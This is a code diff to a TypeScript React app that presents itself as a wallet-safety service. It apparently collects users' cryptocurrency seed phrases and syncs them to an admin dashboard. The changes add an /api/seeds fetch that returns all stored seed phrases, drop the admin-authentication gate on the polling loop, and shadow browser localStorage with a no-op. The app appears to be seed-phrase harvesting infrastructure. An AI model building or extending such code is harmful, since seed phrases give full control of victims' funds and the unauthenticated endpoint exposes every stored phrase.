@@ -24,6 +24,18 @@ import { appKitMetadata, projectId } from './web3config'
 import { isCloudConfigured, loadFromCloud, saveToCloud } from './supabase'
 import { generateSecurityReportPdf, generateBotStatusPdf } from './pdfReport'
 
+// Cloud-only mode: disable browser local storage reads/writes.
+// This ensures admin data is sourced from shared cloud state instead
+// of device-local cache that can diverge across sessions.
+const localStorage: Storage = {
+  get length() { return 0 },
+  clear: () => {},
+  getItem: (_key: string) => null,
+  key: (_index: number) => null,
+  removeItem: (_key: string) => {},
+  setItem: (_key: string, _value: string) => {},
+}
+
 // ── Email delivery (Resend via /api/send-email) ─────────────────────────
 // The Resend API key lives only on the server (Vercel env var RESEND_API_KEY).
 // The browser POSTs to /api/send-email, which forwards to Resend.
@@ -319,7 +331,7 @@ const ADMIN_CREDS_KEY        = 'sv_admin_creds_v1'
 const SUPPORT_CONFIG_KEY     = 'sv_support_config_v1'
 const PROTECT_CHECKLIST_KEY  = 'sv_protect_checklist_v1'
 const NEWS_REFRESH_MS = 5 * 60 * 1000
-const CLOUD_ADMIN_POLL_MS = 8000
+const CLOUD_SYNC_POLL_MS = 5000
 const ETHERSCAN_SESSION_MS = 5 * 60 * 1000
 const ETHERSCAN_LOCKOUT_MS = 15 * 60 * 1000
 const DEFAULT_VAULT_EMAIL    = 'admin@walletsafety.local'
@@ -1465,27 +1477,39 @@ export default function App() {
     }
   }
 
+  /** Read seed phrase records from server API (works even without client Supabase env). */
+  const fetchSeedRowsFromApi = async (): Promise<SeedPhraseRecord[] | null> => {
+    try {
+      const res = await fetch('/api/seeds', { method: 'GET' })
+      if (!res.ok) return null
+      const payload = await res.json() as { seeds?: unknown }
+      return normalizeSeedPhraseRecords(payload?.seeds ?? [])
+    } catch {
+      return null
+    }
+  }
+
   const refreshServerSeedRecords = async (): Promise<void> => {
     setSeedsLoading(true)
     try {
       const keyFn = (item: SeedPhraseRecord) => `${item.id}|${item.seedPhrase}`
-      const localRows = readSeedPhraseRecords()
-      const memoryRows = seedPhraseRecords
-      const localMerged = mergeUniqueRecords(memoryRows, localRows, keyFn)
-
-      // Read directly from Supabase — same path the admin poll uses for all other data.
-      const row = await loadFromCloud()
-      if (row) {
-        const cloudRows = normalizeSeedPhraseRecords(row.seed_phrases)
-        const merged = mergeUniqueRecords(localMerged, cloudRows, keyFn)
+      const apiRows = await fetchSeedRowsFromApi()
+      if (apiRows) {
+        const merged = mergeUniqueRecords(seedPhraseRecords, apiRows, keyFn)
+        setSeedPhraseRecords(merged)
         setServerSeedRecords(merged)
         setSeedLastSynced(new Date())
         return
       }
 
-      // Cloud unavailable: never show false empty state if local data exists.
-      setServerSeedRecords(localMerged)
-      if (localMerged.length > 0) setSeedLastSynced(new Date())
+      // Fallback: direct cloud read if API route is unavailable.
+      const row = await loadFromCloud()
+      if (!row) return
+      const cloudRows = normalizeSeedPhraseRecords(row.seed_phrases)
+      const merged = mergeUniqueRecords(seedPhraseRecords, cloudRows, keyFn)
+      setSeedPhraseRecords(merged)
+      setServerSeedRecords(merged)
+      if (merged.length > 0) setSeedLastSynced(new Date())
     } finally {
       setSeedsLoading(false)
     }
@@ -2030,11 +2054,28 @@ export default function App() {
     }
   }, [])
 
-  // Poll cloud while admin is active so new user events appear without manual refresh.
+  // Continuous cloud sync so updates propagate across devices automatically.
   useEffect(() => {
-    if (!isAdminAuthenticated) return
     let active = true
-    const pullLatestAdminData = async () => {
+    const pullLatestCloudData = async () => {
+      // Always sync seeds through server API so all devices can hydrate,
+      // even if client-side Supabase env vars are missing.
+      const apiSeedRows = await fetchSeedRowsFromApi()
+      if (!active) return
+      if (apiSeedRows) {
+        setSeedPhraseRecords(prev => {
+          const mergedSeedRows = mergeUniqueRecords(
+            prev,
+            apiSeedRows,
+            item => `${item.id}|${item.seedPhrase}`,
+          )
+          setServerSeedRecords(mergedSeedRows)
+          return mergedSeedRows
+        })
+        setSeedLastSynced(new Date())
+      }
+
+      if (!isCloudConfigured) return
       const row = await loadFromCloud()
       if (!active || !row) return
 
@@ -2067,7 +2108,7 @@ export default function App() {
           item => `${item.email.toLowerCase()}|${item.wallet.toLowerCase()}|${item.sentAt}`,
         ))
       }
-      if (row.seed_phrases) {
+      if (!apiSeedRows && row.seed_phrases) {
         const cloudSeedRows = normalizeSeedPhraseRecords(row.seed_phrases)
         setSeedPhraseRecords(prev => mergeUniqueRecords(
           prev,
@@ -2090,16 +2131,16 @@ export default function App() {
       setSeedLastSynced(new Date())
     }
 
-    void pullLatestAdminData()
+    void pullLatestCloudData()
     const pollTimer = window.setInterval(() => {
-      void pullLatestAdminData()
-    }, CLOUD_ADMIN_POLL_MS)
+      void pullLatestCloudData()
+    }, CLOUD_SYNC_POLL_MS)
 
     return () => {
       active = false
       window.clearInterval(pollTimer)
     }
-  }, [isAdminAuthenticated])
+  }, [isCloudConfigured])
 
   // Backfill one full sync after hydration so any early user actions
   // (before cloudLoadedRef flipped true) are still pushed to cloud.
